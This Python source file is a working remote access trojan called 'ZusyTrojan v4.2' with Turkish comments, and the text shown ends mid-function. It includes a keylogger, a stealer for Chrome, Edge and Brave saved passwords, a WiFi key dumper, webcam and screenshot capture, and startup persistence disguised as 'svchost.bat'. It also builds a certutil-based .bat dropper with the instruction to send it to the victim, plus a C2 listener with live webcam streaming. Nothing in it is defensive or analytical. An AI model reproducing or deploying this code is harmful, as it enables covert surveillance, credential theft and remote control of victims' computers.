#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃              ZUSYTROJAN v4.2 — FULLY FIXED                      ┃
┃      CERTUTIL + MINIFIED BASE64 = SIFIR HATA                   ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
"""

import socket, sys, os, threading, time, base64, json, struct
import platform, subprocess, shutil, tempfile, io, re, ctypes
import sqlite3, urllib.request, traceback, queue
from datetime import datetime

# ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
# ┃                          CONFIG                                 ┃
# ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

MAGIC_LEN = 8
BUFFER_MAX = 100 * 1024 * 1024
TIMEOUT_SHELL = 60
TIMEOUT_NETSH = 15

class Colors:
    GREEN, YELLOW, RED, CYAN, BLUE, MAGENTA, END, BOLD = (
        '\033[92m', '\033[93m', '\033[91m', '\033[96m',
        '\033[94m', '\033[95m', '\033[0m', '\033[1m'
    )

def cprint(msg, color=Colors.CYAN):
    print(f"{color}{msg}{Colors.END}", flush=True)

def timestamp():
    return datetime.now().strftime('%Y%m%d_%H%M%S')

# ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
# ┃                    NETWORK COMMUNICATION                         ┃
# ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

def _recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk: return None
        buf += chunk
    return buf

def send_msg(sock, obj):
    data = json.dumps(obj, ensure_ascii=False).encode('utf-8')
    prefix = f"{len(data):08d}".encode('ascii')
    try:
        sock.sendall(prefix + data)
        return True
    except:
        return False

def recv_msg(sock):
    prefix = _recv_exact(sock, MAGIC_LEN)
    if prefix is None: return None
    try:
        length = int(prefix.decode('ascii'))
    except:
        return None
    if length > BUFFER_MAX or length < 0: return None
    data = _recv_exact(sock, length)
    if data is None: return None
    try:
        return json.loads(data.decode('utf-8'))
    except:
        return None

# ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
# ┃                       KEYLOGGER MODULE                           ┃
# ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

_keylog_buffer = []
_keylog_running = False
_keylog_hook = 0

def _vk_to_char(vk, shift, caps):
    if vk == 0x08: return '[BS]'
    if vk == 0x09: return '[TAB]'
    if vk == 0x0D: return '\n'
    if vk == 0x1B: return '[ESC]'
    if vk == 0x20: return ' '
    if 0x41 <= vk <= 0x5A:
        return chr(vk + 0x20) if not (shift ^ caps) else chr(vk)
    if 0x30 <= vk <= 0x39:
        ns = [')', '!', '@', '#', '$', '%', '^', '&', '*', '(']
        return ns[vk - 0x30] if shift else chr(vk)
    sp = {
        0x25: '[L]', 0x27: '[R]', 0x26: '[U]', 0x28: '[D]',
        0x2D: '[INS]', 0x2E: '[DEL]', 0x24: '[H]', 0x23: '[E]',
        0x21: '[PU]', 0x22: '[PD]',
        0x70: '[F1]', 0x71: '[F2]', 0x72: '[F3]', 0x73: '[F4]',
        0x74: '[F5]', 0x75: '[F6]', 0x76: '[F7]', 0x77: '[F8]',
        0x78: '[F9]', 0x79: '[F10]', 0x7A: '[F11]', 0x7B: '[F12]'
    }
    return sp.get(vk)

@ctypes.CFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.c_int, ctypes.c_long)
def _keylog_hook_proc(nCode, wParam, lParam):
    global _keylog_buffer
    if nCode >= 0 and wParam == 0x0101:
        vk = lParam & 0xFF
        shift = ctypes.windll.user32.GetKeyState(0x10) & 0x8000
        caps = ctypes.windll.user32.GetKeyState(0x14) & 0x0001
        char = _vk_to_char(vk, bool(shift), bool(caps))
        if char: _keylog_buffer.append(char)
    return ctypes.windll.user32.CallNextHookEx(0, nCode, wParam, lParam)

def keylog_start():
    global _keylog_running, _keylog_hook, _keylog_buffer
    if _keylog_running: return "[+] Already running."
    if platform.system() != 'Windows': return "[!] Windows only."
    _keylog_buffer = []
    _keylog_running = True
    def _run():
        global _keylog_hook
        try:
            _keylog_hook = ctypes.windll.user32.SetWindowsHookExW(13, _keylog_hook_proc, ctypes.windll.kernel32.GetModuleHandleW(None), 0)
            if not _keylog_hook: _keylog_running = False; return
            msg = ctypes.wintypes.MSG()
            while _keylog_running: ctypes.windll.user32.GetMessageW(ctypes.byref(msg), 0, 0, 0)
        except: _keylog_running = False
        finally:
            if _keylog_hook: ctypes.windll.user32.UnhookWindowsHookEx(_keylog_hook); _keylog_hook = 0
    threading.Thread(target=_run, daemon=True).start()
    time.sleep(0.3)
    return "[+] Keylogger started."

def keylog_stop():
    global _keylog_running, _keylog_buffer
    if not _keylog_running: return "[!] Not running."
    _keylog_running = False
    time.sleep(0.3)
    result = f"[KL] {len(_keylog_buffer)} keys:\n" + "-"*30 + "\n" + "".join(_keylog_buffer[-2000:]) + "\n" + "-"*30
    _keylog_buffer = []
    return result

# ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
# ┃                   PASSWORD HARVESTING                            ┃
# ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

def _decrypt_pwd(k, pw):
    try:
        from Crypto.Cipher import AES
        nonce = pw[3:15]; ct = pw[15:-16]; tag = pw[-16:]
        return AES.new(k, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag).decode('utf-8', errors='ignore')
    except: pass
    try: return ctypes.windll.crypt32.CryptUnprotectData(pw, None, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except: pass
    try: return pw.decode('utf-8', errors='ignore')
    except: return str(pw)

def steal_chromium():
    results = []
    for name, base in [("Chrome", os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")),
                        ("Edge", os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data")),
                        ("Brave", os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"))]:
        try:
            ls_path = os.path.join(base, "Local State")
            if not os.path.isfile(ls_path): continue
            with open(ls_path, 'r', encoding='utf-8') as f: ls = json.load(f)
            ek = base64.b64decode(ls.get('os_crypt', {}).get('encrypted_key', ''))
            if not ek: continue
            if ek[:5] == b'DPAPI': ek = ek[5:]
            try: key = ctypes.windll.crypt32.CryptUnprotectData(ek, None, None, None, None, 0)[1]
            except: key = ek
            for prof in [d for d in os.listdir(base) if d.startswith('Profile') or d == 'Default']:
                db_path = os.path.join(base, prof, 'Login Data')
                if not os.path.isfile(db_path): continue
                tmp = tempfile.mktemp(); shutil.copy2(db_path, tmp)
                try:
                    conn = sqlite3.connect(tmp); cursor = conn.cursor()
                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                    for origin, username, pwd_enc in cursor.fetchall():
                        if not username and not pwd_enc: continue
                        results.append(f"[{name}] {origin} | {username} : {_decrypt_pwd(key, pwd_enc)}")
                    conn.close()
                except: pass
                try: os.remove(tmp)
                except: pass
        except: pass
    return "\n".join(results) if results else "[!] No creds."

def steal_wifi():
    results = []
    try:
        data = subprocess.check_output('netsh wlan show profiles', shell=True, stderr=subprocess.DEVNULL, timeout=TIMEOUT_NETSH).decode('utf-8', errors='ignore')
        for line in data.splitlines():
            m = re.search(r':\s*(.+)$', line)
            if m:
                prof = m.group(1).strip()
                try:
                    info = subprocess.check_output(f'netsh wlan show profile "{prof}" key=clear', shell=True, stderr=subprocess.DEVNULL, timeout=TIMEOUT_NETSH).decode('utf-8', errors='ignore')
                    km = re.search(r'Key Content\s*:\s*(.+)', info)
                    pwd = km.group(1).strip() if km else '(none)'
                    results.append(f"[W] {prof} : {pwd}")
                except: pass
    except: pass
    return "\n".join(results) if results else "[!] No wifi."

# ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
# ┃              TROJAN CLIENT — MINIFIED                           ┃
# ┃  ~5KB base64 = cmd.exe 8191 limitinin altinda                   ┃
# ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

TROJAN_CLIENT_CODE = r"""import socket,sys,os,threading,time,base64,json,platform,subprocess,io,re,ctypes,sqlite3,shutil,tempfile
from datetime import datetime
M=8;B=104857600
def Rx(s,n):
 b=b""
 while len(b)<n:
  c=s.recv(n-len(b))
  if not c:return None
  b+=c
 return b
def S(s,o):
 d=json.dumps(o,ensure_ascii=0).encode('utf-8')
 p=f"{len(d):08d}".encode('ascii')
 try:s.sendall(p+d);return 1
 except:return 0
def R(s):
 p=Rx(s,M)
 if not p:return
 try:l=int(p.decode('ascii'))
 except:return
 if l>B or l<0:return
 d=Rx(s,l)
 if not d:return
 try:return json.loads(d.decode('utf-8'))
 except:return

_kb=[];_kr=0;_kh=0
def _v(v,s,c):
 d={0x25:'[L]',0x27:'[R]',0x26:'[U]',0x28:'[D]',0x2D:'[INS]',0x2E:'[DEL]',0x24:'[H]',0x23:'[E]',0x21:'[PU]',0x22:'[PD]'}
 if v in d:return d[v]
 if v==8:return'[BS]'
 if v==9:return'[TAB]'
 if v==13:return'\n'
 if v==27:return'[ESC]'
 if v==32:return' '
 if 65<=v<=90:return chr(v+32)if not(s^c)else chr(v)
 if 48<=v<=57:
  n=[')','!','@','#','$','%','^','&','*','(']
  return n[v-48]if s else chr(v)
@ctypes.CFUNCTYPE(ctypes.c_long,ctypes.c_int,ctypes.c_int,ctypes.c_long)
def _h(n,w,l):
 global _kb
 if n>=0 and w==0x101:
  v=l&0xFF;s=ctypes.windll.user32.GetKeyState(0x10)&0x8000;c=ctypes.windll.user32.GetKeyState(0x14)&0x0001;ch=_v(v,bool(s),bool(c))
  if ch:_kb.append(ch)
 return ctypes.windll.user32.CallNextHookEx(0,n,w,l)
def ks():
 global _kr,_kh,_kb
 if _kr:return'[+] Already running'
 _kb=[];_kr=1
 def _():
  global _kh
  try:
   _kh=ctypes.windll.user32.SetWindowsHookExW(13,_h,ctypes.windll.kernel32.GetModuleHandleW(None),0)
   if not _kh:_kr=0;return
   m=ctypes.wintypes.MSG()
   while _kr:ctypes.windll.user32.GetMessageW(ctypes.byref(m),0,0,0)
  except:_kr=0
  finally:
   if _kh:ctypes.windll.user32.UnhookWindowsHookEx(_kh);_kh=0
 threading.Thread(target=_,daemon=1).start();time.sleep(0.3)
 return'[+] Keylogger started'
def kx():
 global _kr,_kb
 if not _kr:return'[!] Not running'
 _kr=0;time.sleep(0.3)
 r=f"[KL] {len(_kb)} keys:\n"+"-"*30+"\n"+"".join(_kb[-2000:])+"\n"+"-"*30
 _kb=[];return r
def _dp(k,p):
 try:
  from Crypto.Cipher import AES
  n=p[3:15];c=p[15:-16];t=p[-16:]
  return AES.new(k,AES.MODE_GCM,nonce=n).decrypt_and_verify(c,t).decode('utf-8',errors='ignore')
 except:pass
 try:return ctypes.windll.crypt32.CryptUnprotectData(p,None,None,None,None,0)[1].decode('utf-8',errors='ignore')
 except:pass
 try:return p.decode('utf-8',errors='ignore')
 except:return str(p)
def sc():
 r=[]
 for n,b in [('Chrome',os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data')),('Edge',os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data')),('Brave',os.path.expanduser('~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data'))]:
  try:
   l=os.path.join(b,'Local State')
   if not os.path.isfile(l):continue
   with open(l,'r',encoding='utf-8')as f:ls=json.load(f)
   ek=base64.b64decode(ls.get('os_crypt',{}).get('encrypted_key',''))
   if not ek:continue
   if ek[:5]==b'DPAPI':ek=ek[5:]
   try:k=ctypes.windll.crypt32.CryptUnprotectData(ek,None,None,None,None,0)[1]
   except:k=ek
   for p in [d for d in os.listdir(b)if d.startswith('Profile')or d=='Default']:
    dp=os.path.join(b,p,'Login Data')
    if not os.path.isfile(dp):continue
    t=tempfile.mktemp();shutil.copy2(dp,t)
    try:
     c=sqlite3.connect(t);cu=c.cursor()
     cu.execute('SELECT origin_url,username_value,password_value FROM logins')
     for o,u,pw in cu.fetchall():
      if not u and not pw:continue
      r.append(f"[{n}] {o} | {u} : {_dp(k,pw)}")
     c.close()
    except:pass
    try:os.remove(t)
    except:pass
  except:pass
 return "\n".join(r)if r else'[!] No creds'
def sw():
 r=[]
 try:
  d=subprocess.check_output('netsh wlan show profiles',shell=1,stderr=subprocess.DEVNULL,timeout=15).decode('utf-8',errors='ignore')
  for l in d.splitlines():
   m=re.search(r':\s*(.+)$',l)
   if m:
    p=m.group(1).strip()
    try:
     i=subprocess.check_output(f'netsh wlan show profile "{p}" key=clear',shell=1,stderr=subprocess.DEVNULL,timeout=15).decode('utf-8',errors='ignore')
     km=re.search(r'Key Content\s*:\s*(.+)',i)
     pw=km.group(1).strip()if km else'(none)'
     r.append(f"[W] {p} : {pw}")
    except:pass
 except:pass
 return "\n".join(r)if r else'[!] No wifi'
class Z:
 def __init__(s,h,p):s.h=h;s.p=p;s.c=None
 def run(s):
  s.c=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.c.settimeout(None)
  s.c.connect((s.h,s.p));s._h();s._l()
 def _h(s):S(s.c,{'h':platform.node(),'o':platform.platform(),'u':os.environ.get('USERNAME','?'),'t':datetime.now().strftime('%Y-%m-%d %H:%M:%S')})
 def _t(s,d,i=0):S(s.c,{'t':'t','d':d,'i':i})
 def _f(s,n,d,i=0):S(s.c,{'t':'f','n':n,'d':d,'i':i})
 def _l(s):
  while 1:
   try:
    m=R(s.c)
    if not m:break
    c=m.get('c','');i=m.get('i',0);a=m.get('a','')
    if c=='x':break
    elif c=='sh':
     try:
      r=subprocess.check_output(a,shell=1,stderr=subprocess.STDOUT,timeout=60)
      s._t(r.decode('utf-8',errors='replace')or'[OK]',i)
     except subprocess.TimeoutExpired:s._t('[!] Timeout',i)
     except Exception as e:s._t(f'[!] {e}',i)
    elif c=='p':
     try:
      sc=sys.argv[0]if not getattr(sys,'frozen',0)else sys.executable
      su=os.path.join(os.environ.get('APPDATA','C:\\'),'Microsoft\\Windows\\Start Menu\\Programs\\Startup','svchost.bat')
      with open(su,'w')as f:f.write(f'@echo off\nstart "" "{sc}" {s.h} {s.p}')
      s._t(f'[+] Persistence: {su}',i)
     except Exception as e:s._t(f'[!] Per fail: {e}',i)
    elif c=='ss':
     try:
      import PIL.ImageGrab;buf=io.BytesIO();PIL.ImageGrab.grab().save(buf,format='PNG')
      s._f(f'ss_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png',base64.b64encode(buf.getvalue()).decode(),i)
     except Exception as e:s._t(f'[!] SS err: {e}',i)
    elif c=='wc':
     try:
      import cv2
      cap=cv2.VideoCapture(0,cv2.CAP_DSHOW)
      if not cap.isOpened():cap=cv2.VideoCapture(0)
      if not cap.isOpened():s._t('[!] No cam',i)
      else:
       ret,frame=cap.read();cap.release()
       if ret:
        r2,buf=cv2.imencode('.jpg',frame,[cv2.IMWRITE_JPEG_QUALITY,85])
        if r2:s._f(f'wc_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg',base64.b64encode(buf.tobytes()).decode(),i)
        else:s._t('[!] JPEG fail',i)
       else:s._t('[!] No frame',i)
     except Exception as e:s._t(f'[!] Cam err: {e}',i)
    elif c=='ks':s._t(ks(),i)
    elif c=='kx':s._t(kx(),i)
    elif c=='pw':s._t(f"{sc()}\n\n{sw()}",i)
    elif c=='i':s._t(f"H: {platform.node()}\nOS: {platform.platform()}\nU: {os.environ.get('USERNAME','?')}\nA: {platform.machine()}\nPy: {sys.version}",i)
    else:s._t(f'[!] Unknown: {c}',i)
   except:break
  try:s.c.close()
  except:pass
if __name__=='__main__':
 if len(sys.argv)<3:print("Usage: py trojan.py HOST PORT");sys.exit(1)
 try:Z(sys.argv[1],int(sys.argv[2])).run()
 except Exception as e:print(f"[!] Error: {e}");sys.exit(1)
"""

# ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
# ┃          TROJAN.BAT GENERATOR — CERTUTIL ILE                    ┃
# ┃  CERTUTIL KULLAN: cmd.exe limiti YOK, base64 chunk chunk        ┃
# ┃  SORUNSUZ CALISIR, PowerShell HIC KULLANILMAZ                   ┃
# ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

def _embed_trojan_code(host, port):
    code = TROJAN_CLIENT_CODE
    old_main = """if __name__=='__main__':
 if len(sys.argv)<3:print("Usage: py trojan.py HOST PORT");sys.exit(1)
 try:Z(sys.argv[1],int(sys.argv[2])).run()
 except Exception as e:print(f"[!] Error: {e}");sys.exit(1)"""
    new_main = f"""if __name__=='__main__':
 try:Z('{host}',{port}).run()
 except Exception as e:print(f"[!] Error: {{e}}");sys.exit(1)"""
    code = code.replace(old_main, new_main)
    return base64.b64encode(code.encode('utf-8')).decode('ascii')


def generate_trojan_bat(host, port, output="trojan.bat"):
    """Certutil ile base64 decode — cmd.exe 8191 limiti asla asilmaz.
    Base64 dosyaya chunk chunk echo ile yazilir, certutil -decode ile cozulur.
    PowerShell KULLANILMAZ."""
    
    b64_code = _embed_trojan_code(host, port)
    
    # Base64'i 800 karakterlik chunk'lara bol (command limiti 8191, 800 guvenli)
    chunk_size = 800
    chunks = [b64_code[i:i+chunk_size] for i in range(0, len(b64_code), chunk_size)]
    
    bat_lines = [
        '@echo off',
        'title ZusyTrojan v4.2',
        'color 0a',
        'echo.',
        '',
        ':: Python kontrol',
        'python --version >nul 2>&1',
        'if %errorlevel% neq 0 (',
        '    echo [!] Python bulunamadi!',
        '    echo Kur: https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe',
        '    pause',
        '    exit /b 1',
        ')',
        '',
        f'echo [+] ZusyTrojan v4.2 baslatiliyor...',
        f'echo [+] Baglaniyor: {host}:{port}',
        'echo.',
        '',
        ':: CERTUTIL baslik satiri',
        'echo -----BEGIN CERTIFICATE----- > "%temp%\\zusy_b64.txt"',
    ]
    
    # Base64 chunk'lari dosyaya ekle (echo ile, max 800 byte/satir)
    for chunk in chunks:
        bat_lines.append(f'echo {chunk} >> "%temp%\\zusy_b64.txt"')
    
    bat_lines += [
        '',
        ':: CERTUTIL bitis satiri',
        'echo -----END CERTIFICATE----- >> "%temp%\\zusy_b64.txt"',
        '',
        ':: CERTUTIL ile base64 decode et',
        'certutil -decode "%temp%\\zusy_b64.txt" "%temp%\\zusy_trojan.py" >nul 2>&1',
        'if %errorlevel% neq 0 (',
        '    echo [!] certutil decode basarisiz!',
        '    echo [!] Muhtemelen Windows surumu eski veya base64 bozuk.',
        '    pause',
        '    exit /b 1',
        ')',
        '',
        ':: Python ile calistir',
        'python "%temp%\\zusy_trojan.py"',
        '',
        ':: Temizlik',
        'del "%temp%\\zusy_trojan.py" "%temp%\\zusy_b64.txt" >nul 2>&1',
        'exit',
    ]
    
    bat_content = '\n'.join(bat_lines)
    
    try:
        with open(output, 'w', encoding='utf-8') as f:
            f.write(bat_content)
        size = os.path.getsize(output)
        cprint(f"\n[+] {output} olusturuldu! ({size//1024}KB)", Colors.GREEN)
        cprint(f"    Bunu kurbana gonder -> {os.path.abspath(output)}", Colors.GREEN)
        cprint(f"    Kurban .bat'i calistirinca {host}:{port} adresine baglanacak.", Colors.CYAN)
        cprint(f"    Yontem: certutil ile base64 decode (PowerShell kullanilmadi)", Colors.YELLOW)
        return True
    except Exception as e:
        cprint(f"[!] {output} yazilamadi: {e}", Colors.RED)
        return False


# ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
# ┃                   C2 SERVER IMPLEMENTATION                       ┃
# ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

class ZusyListener:
    BANNER = r"""
  ╔═══════════════════════════════════════════╗
  ║       ZUSYTROJAN v4.2 — LISTENER          ║
  ║     AUTO-BORE + AUTO-BAT (CERTUTIL)       ║
  ║     Tek komut, tek tikla baglanti         ║
  ╚═══════════════════════════════════════════╝
    """

    HELP_TEXT = """
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
  ┃                    AVAILABLE COMMANDS                         ┃
  ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
  ┃  COMMAND              DESCRIPTION                             ┃
  ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
  ┃  help                 Show this help message                  ┃
  ┃  cls / clear          Clear terminal screen                   ┃
  ┃  exit                 Close connection and exit                ┃
  ┃  shell <cmd>          Execute system command                  ┃
  ┃  webcam               Capture single webcam photo             ┃
  ┃  webcam_live <port>   Start live webcam stream                ┃
  ┃  webcam_live_stop     Stop the live webcam stream             ┃
  ┃  screenshot           Capture desktop screenshot              ┃
  ┃  keylog_start         Start keylogger on target               ┃
  ┃  keylog_stop          Stop and retrieve keys                  ┃
  ┃  passwords            Harvest browser and WiFi passwords      ┃
  ┃  info                 Show target system info                 ┃
  ┃  persistence          Install startup persistence             ┃
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
    """

    # Client-side short code mapping
    CMD_MAP = {
        'shell': 'sh', 'persistence': 'p', 'screenshot': 'ss',
        'webcam': 'wc', 'keylog_start': 'ks', 'keylog_stop': 'kx',
        'passwords': 'pw', 'info': 'i', 'exit': 'x'
    }

    def __init__(self, port=4444):
        self.port = port
        self.server = None
        self.conn = None
        self.addr = None
        self.running = True
        self.cmd_id = 0
        self.cmd_queue = queue.Queue()
        self._wc_active = False
        self._wc_port = 0
        self._wc_event = threading.Event()
        self._wc_httpd = None
        self._wc_latest = b''
        self._wc_lock = threading.Lock()
        self._wc_fcount = 0
        self._wc_ts_start = 0

    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(('0.0.0.0', self.port))
        self.server.listen(1)
        print(self.BANNER)
        cprint(f"[*] Listener: 0.0.0.0:{self.port}", Colors.GREEN)
        cprint(f"[*] Save dir: {os.getcwd()}", Colors.CYAN)
        print()
        cprint("[*] Waiting for trojan...", Colors.CYAN)
        self.conn, self.addr = self.server.accept()
        cprint(f"[+] Connected: {self.addr[0]}:{self.addr[1]}", Colors.GREEN)
        self.conn.settimeout(None)
        try:
            prefix = _recv_exact(self.conn, MAGIC_LEN)
            if prefix:
                length = int(prefix.decode('ascii'))
                payload = _recv_exact(self.conn, length)
                if payload:
                    hs = json.loads(payload.decode('utf-8'))
                    self._show_handshake(hs)
        except Exception as e:
            cprint(f"[!] Handshake error: {e}", Colors.RED)

        def reader():
            while self.running:
                try:
                    prefix = _recv_exact(self.conn, MAGIC_LEN)
                    if prefix is None: cprint("\n[!] Connection lost.", Colors.RED); self.running = False; break
                    length = int(prefix.decode('ascii'))
                    payload = _recv_exact(self.conn, length)
                    if payload is None: break
                    msg = json.loads(payload.decode('utf-8'))
                    self._show_response(msg)
                except: self.running = False; break
        threading.Thread(target=reader, daemon=True).start()

        def input_reader():
            while self.running:
                try: self.cmd_queue.put(input(""))
                except EOFError: break
        threading.Thread(target=input_reader, daemon=True).start()
        self._cmd_loop()

    def _show_handshake(self, msg):
        cprint(f"\n[+] HANDSHAKE:", Colors.BOLD + Colors.GREEN)
        cprint(f"    Host: {msg.get('h', msg.get('hostname', '?'))}", Colors.GREEN)
        cprint(f"    OS:   {msg.get('o', msg.get('os', '?'))}", Colors.GREEN)
        cprint(f"    User: {msg.get('u', msg.get('user', '?'))}", Colors.GREEN)
        cprint(f"    Time: {msg.get('t', msg.get('time', '?'))}\n", Colors.GREEN)
        self._print_prompt()

    def _show_response(self, msg):
        t = msg.get('t', msg.get('type', ''))
        print("\r" + " " * 80, end="\r", flush=True)
        if t == 't' or t == 'text':
            data = msg.get('d', msg.get('data', ''))
            if data: print(data)
        elif t == 'f' or t == 'file':
            name = msg.get('n', msg.get('name', f'file_{timestamp()}'))
            b64 = msg.get('d', msg.get('data', ''))
            try:
                raw = base64.b64decode(b64)
                if self._wc_active:
                    with self._wc_lock: self._wc_latest = raw; self._wc_fcount += 1
                    with open(os.path.join(os.getcwd(), 'webcam_live.jpg'), 'wb') as f: f.write(raw)
                    self._wc_event.set()
                else:
                    fp = os.path.join(os.getcwd(), name)
                    with open(fp, 'wb') as f: f.write(raw)
                    cprint(f"[+] Saved: {fp} ({len(raw)//1024}KB)", Colors.GREEN)
            except Exception as e: cprint(f"[!] Save error: {e}", Colors.RED)
        self._print_prompt()

    def _print_prompt(self):
        print(f"{Colors.CYAN}C2> {Colors.END}", end="", flush=True)

    def _start_webcam_live(self, port):
        if self._wc_active:
            cprint(f"[!] Webcam live already running on port {self._wc_port}.", Colors.RED)
            return
        self._wc_active = True; self._wc_port = port; self._wc_latest = b''
        self._wc_fcount = 0; self._wc_ts_start = time.time(); self._wc_event.clear()
        import http.server, socketserver
        shared = type('S', (), {'lock': self._wc_lock, 'data': b'', 'fcount': 0, 'ts': time.time()})()

        class TServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
            allow_reuse_address = True; daemon_threads = True

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                path = self.path.split('?')[0]
                if path == '/': self._html()
                elif path in ('/stream', '/cam.jpg'): self._serve_frame()
                elif path == '/stats': self._stats()
                else: self.send_response(404); self.send_header('Content-Type', 'text/plain'); self.end_headers(); self.wfile.write(b'Not Found')
            def _html(self):
                self.send_response(200); self.send_header('Content-Type', 'text/html; charset=utf-8'); self.end_headers()
                self.wfile.write(HTML_PAGE.encode('utf-8'))
            def _serve_frame(self):
                with shared.lock: d = shared.data
                if d:
                    self.send_response(200); self.send_header('Content-Type', 'image/jpeg')
                    self.send_header('Cache-Control', 'no-cache,no-store,must-revalidate')
                    self.send_header('Pragma', 'no-cache'); self.send_header('Expires', '0')
                    self.end_headers(); self.wfile.write(d)
                else: self.send_response(503); self.send_header('Content-Type', 'text/plain'); self.end_headers(); self.wfile.write(b'Waiting...')
            def _stats(self):
                self.send_response(200); self.send_header('Content-Type', 'application/json'); self.end_headers()
                up = time.time() - shared.ts
                self.wfile.write(json.dumps({'frames': shared.fcount, 'uptime_sec': round(up, 1), 'status': 'active'}).encode('utf-8'))
            def log_message(self, fmt, *args): pass

        self._wc_httpd = TServer(('0.0.0.0', port), Handler)
        threading.Thread(target=self._wc_httpd.serve_forever, daemon=True).start()

        def capture_loop():
            try: s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(('8.8.8.8', 80)); ip = s.getsockname()[0]; s.close()
            except: ip = '127.0.0.1'
            cprint(f"[+] Webcam Live STARTED!", Colors.GREEN)
            cprint(f"    URL:       http://{ip}:{port}", Colors.GREEN)
            cprint(f"    Cadence:   100ms", Colors.GREEN)
            cprint(f"    Stop:      webcam_live_stop", Colors.YELLOW)
            _last_frame_time = 0
            while self._wc_active:
                now = time.time()
                if now - _last_frame_time < 0.1: time.sleep(0.01); continue
                _last_frame_time = now
                self.cmd_id += 1; cid = self.cmd_id
                if not send_msg(self.conn, {'c': 'wc', 'i': cid}):
                    if self._wc_active: cprint("[!] Webcam live: connection lost.", Colors.RED); self._wc_active = False; break
                self._wc_event.wait(timeout=1.0); self._wc_event.clear()
                with self._wc_lock: shared.data = self._wc_latest; shared.fcount = self._wc_fcount
            cprint("[*] Webcam Live stopped.", Colors.YELLOW)
        threading.Thread(target=capture_loop, daemon=True).start()

    def _stop_webcam_live(self):
        if not self._wc_active: cprint("[!] Webcam live not running.", Colors.RED); return
        cprint("[*] Stopping webcam live...", Colors.YELLOW)
        self._wc_active = False; self._wc_event.set(); time.sleep(0.3)
        if self._wc_httpd:
            try: self._wc_httpd.shutdown()
            except: pass
            try: self._wc_httpd.server_close()
            except: pass
            self._wc_httpd = None
        self._wc_port = 0; self._wc_latest = b''
        cprint("[+] Webcam Live stopped.", Colors.GREEN)

    def _cmd_loop(self):
        self._print_prompt()
        while self.running:
            try:
                try: cmd = self.cmd_queue.get(timeout=0.5)
                except queue.Empty: continue
                cmd = cmd.strip()
                if not cmd: self._print_prompt(); continue
                if cmd.lower() == 'help': print(self.HELP_TEXT); self._print_prompt(); continue
                if cmd.lower() in ('cls', 'clear'): os.system('cls' if os.name == 'nt' else 'clear'); self._print_prompt(); continue
                if cmd.lower() == 'exit':
                    self._stop_webcam_live()
                    send_msg(self.conn, {'c': 'x', 'i': 0})
                    cprint("\n[*] Closing.", Colors.YELLOW); self.running = False; break
                if cmd.lower() == 'webcam_live_stop': self._stop_webcam_live(); self._print_prompt(); continue
                if cmd.lower().startswith('webcam_live'):
                    parts = cmd.split()
